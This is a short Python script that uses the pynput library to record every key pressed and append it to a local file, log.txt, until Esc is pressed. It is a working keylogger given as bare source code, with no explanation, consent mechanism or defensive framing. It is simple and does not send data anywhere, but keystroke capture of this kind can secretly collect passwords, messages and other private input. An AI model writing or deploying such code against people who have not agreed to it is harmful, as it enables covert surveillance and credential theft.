from pynput.keyboard import Listener, Key

def writeFile(key):
    keyval = str(key)
    keyval=keyval.replace("'","")
    if keyval == 'Key.space':
        keyval=' ' 
    with open("log.txt", 'a') as f:
        f.write(keyval)

def stopFile(key):
    if key == Key.esc:
        return False

with Listener(on_press=writeFile, on_release=stopFile) as l:
    l.join()
